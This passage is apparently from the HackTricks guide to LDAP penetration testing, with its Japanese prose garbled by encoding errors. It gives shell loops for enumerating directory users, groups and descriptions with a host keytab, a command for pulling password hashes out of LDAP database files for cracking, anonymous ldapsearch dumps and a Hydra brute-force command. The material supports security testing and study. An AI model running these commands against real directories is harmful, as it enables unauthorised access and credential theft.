./lsa enum-objects

#Get groups of a user
./list-groups-for-user <username>
./lsa list-groups-for-user <username>
#Get groups of each user
./enum-users | grep "Name:" | sed -e "s,\\\,\\\\\\\,g" | awk '{print $2}' | while read name; do ./list-groups-for-user "$name"; echo -e "========================\n"; done

#Get users of a group
./enum-members --by-name "domain admins"
./lsa enum-members --by-name "domain admins"
#Get users of each group
./enum-groups | grep "Name:" | sed -e "s,\\\,\\\\\\\,g" | awk '{print $2}' | while read name; do echo "$name"; ./enum-members --by-name "$name"; echo -e "========================\n"; done

#Get description of each user
./adtool -a search-user --name CN="*" --keytab=/etc/krb5.keytab -n <Username> | grep "CN" | while read line; do
echo "$line";
./adtool --keytab=/etc/krb5.keytab -n <username> -a lookup-object --dn="$line" --attr "description";
echo "======================"
done
```
## ã‚°ãƒ©ãƒ•ã‚£ã‚«ãƒ«ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹

### Apache Directory

[**ã“ã“ã‹ã‚‰Apache Directoryã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ã¦ãã ã•ã„**](https://directory.apache.org/studio/download/download-linux.html)ã€‚ã“ã®ãƒ„ãƒ¼ãƒ«ã®ä½¿ç”¨ä¾‹ã¯[ã“ã¡ã‚‰ã§ç¢ºèªã§ãã¾ã™](https://www.youtube.com/watch?v=VofMBg2VLnw\&t=3840s)ã€‚

### jxplorer

LDAPã‚µãƒ¼ãƒãƒ¼ç”¨ã®ã‚°ãƒ©ãƒ•ã‚£ã‚«ãƒ«ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã¯ã“ã¡ã‚‰ã‹ã‚‰ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã§ãã¾ã™ï¼š[http://www.jxplorer.org/downloads/users.html](http://www.jxplorer.org/downloads/users.html)

ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€ä»¥ä¸‹ã®å ´æ‰€ã«ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚Œã¾ã™ï¼š _/opt/jxplorer_

![](<../.gitbook/assets/image (22) (1).png>)

### Godap

[https://github.com/Macmod/godap](https://github.com/Macmod/godap) ã§ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ã€‚

## kerberosçµŒç”±ã§ã®èªè¨¼

`ldapsearch` ã‚’ä½¿ç”¨ã—ã¦ã€**NTLM** ã§ã¯ãªã **kerberos** ã«å¯¾ã—ã¦**èªè¨¼**ã™ã‚‹ã«ã¯ã€ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ `-Y GSSAPI` ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

## POST

ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ãŒå«ã¾ã‚Œã¦ã„ã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹å ´åˆï¼ˆ_/var/lib/ldap_ ã«ã‚ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ï¼‰ã€ä»¥ä¸‹ã‚’ä½¿ç”¨ã—ã¦ãƒãƒƒã‚·ãƒ¥ã‚’æŠ½å‡ºã§ãã¾ã™ï¼š
```bash
cat /var/lib/ldap/*.bdb | grep -i -a -E -o "description.*" | sort | uniq -u
```
johnã«ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒãƒƒã‚·ãƒ¥ã‚’ä¾›çµ¦ã§ãã¾ã™ï¼ˆ'{SSHA}'ã‹ã‚‰'structural'ã¾ã§ã§ã€'structural'ã‚’è¿½åŠ ã›ãšã«ï¼‰ã€‚

### è¨­å®šãƒ•ã‚¡ã‚¤ãƒ«

* ä¸€èˆ¬
* containers.ldif
* ldap.cfg
* ldap.conf
* ldap.xml
* ldap-config.xml
* ldap-realm.xml
* slapd.conf
* IBM SecureWay V3 ã‚µãƒ¼ãƒãƒ¼
* V3.sas.oc
* Microsoft Active Directory ã‚µãƒ¼ãƒãƒ¼
* msadClassesAttrs.ldif
* Netscape Directory Server 4
* nsslapd.sas\_at.conf
* nsslapd.sas\_oc.conf
* OpenLDAP ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‚µãƒ¼ãƒãƒ¼
* slapd.sas\_at.conf
* slapd.sas\_oc.conf
* Sun ONE Directory Server 5.1
* 75sas.ldif

## HackTricks è‡ªå‹•ã‚³ãƒãƒ³ãƒ‰
```
Protocol_Name: LDAP    #Protocol Abbreviation if there is one.
Port_Number:  389,636     #Comma separated if there is more than one.
Protocol_Description: Lightweight Directory Access Protocol         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for LDAP
Note: |
LDAP (Lightweight Directory Access Protocol) is a software protocol for enabling anyone to locate organizations, individuals, and other resources such as files and devices in a network, whether on the public Internet or on a corporate intranet. LDAP is a "lightweight" (smaller amount of code) version of Directory Access Protocol (DAP).

https://book.hacktricks.xyz/pentesting/pentesting-ldap

Entry_2:
Name: Banner Grab
Description: Grab LDAP Banner
Command: nmap -p 389 --script ldap-search -Pn {IP}

Entry_3:
Name: LdapSearch
Description: Base LdapSearch
Command: ldapsearch -H ldap://{IP} -x

Entry_4:
Name: LdapSearch Naming Context Dump
Description: Attempt to get LDAP Naming Context
Command: ldapsearch -H ldap://{IP} -x -s base namingcontexts

Entry_5:
Name: LdapSearch Big Dump
Description: Need Naming Context to do big dump
Command: ldapsearch -H ldap://{IP} -x -b "{Naming_Context}"

Entry_6:
Name: Hydra Brute Force
Description: Need User
Command: hydra -l {Username} -P {Big_Passwordlist} {IP} ldap2 -V -f
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼šç¤¾**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ**HackTricksã§ä¼šç¤¾ã®åºƒå‘Šã‚’æ²è¼‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**æœ€æ–°ç‰ˆã®PEASSã‚’å…¥æ‰‹**ã—ãŸã‚Šã€**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã¦ãã ã•ã„ã€‚ç§ãŸã¡ã®ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* **[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«å‚åŠ ã™ã‚‹ã‹ã€[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã«ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **[**hacktricksãƒªãƒã‚¸ãƒˆãƒª**](https://github.com/carlospolop/hacktricks)ã¨[**hacktricks-cloudãƒªãƒã‚¸ãƒˆãƒª**](https://github.com/carlospolop/hacktricks-cloud)ã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚**

</details>
